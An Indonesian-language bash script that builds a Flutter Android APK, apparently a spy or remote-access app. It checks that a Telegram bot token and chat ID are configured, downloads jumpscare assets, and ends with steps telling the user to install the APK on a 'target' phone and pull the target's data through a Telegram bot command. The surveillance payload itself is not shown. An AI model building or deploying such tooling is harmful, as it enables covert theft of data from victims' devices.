#!/bin/bash

clear
echo "========================================"
echo "  CAVCASUZ APK BUILDER v12.0"
echo "========================================"
echo ""

# Cek config
if grep -q "MASUKIN_TOKEN_BOT_LU_DISINI" lib/config.dart; then
    echo "❌ ERROR: Lo belom ganti token bot!"
    echo "   Edit lib/config.dart dulu anjing!"
    exit 1
fi

if grep -q "MASUKIN_CHAT_ID_LU_DISINI" lib/config.dart; then
    echo "❌ ERROR: Lo belom ganti chat ID!"
    echo "   Edit lib/config.dart dulu anjing!"
    exit 1
fi

echo "✅ Config OK!"
echo ""

# Download assets
echo "📥 Download assets..."
mkdir -p assets
curl -s -L -o assets/jumpscare.jpg "https://files.catbox.moe/y74ie9.jpg"
curl -s -L -o assets/jumpscare_sound.mp3 "https://files.catbox.moe/lb5cmr.mp3"
echo "✅ Assets downloaded!"
echo ""

# Clean & build
echo "🔨 Building APK..."
flutter clean > /dev/null 2>&1
flutter pub get > /dev/null 2>&1
flutter build apk --debug

echo ""
echo "========================================"
echo "  ✅ BUILD BERHASIL!"
echo "========================================"
echo ""
echo "📍 APK: build/app/outputs/flutter-apk/app-debug.apk"
echo ""
echo "📋 NEXT STEP:"
echo "   1. Install APK ke HP target"
echo "   2. Buka Telegram bot lu"
echo "   3. Ketik /cekperangkat"
echo "   4. Data target langsung masuk!"
echo ""
echo "⚠️ INGAT: Jangan lupa ganti token di lib/config.dart!"
echo "========================================"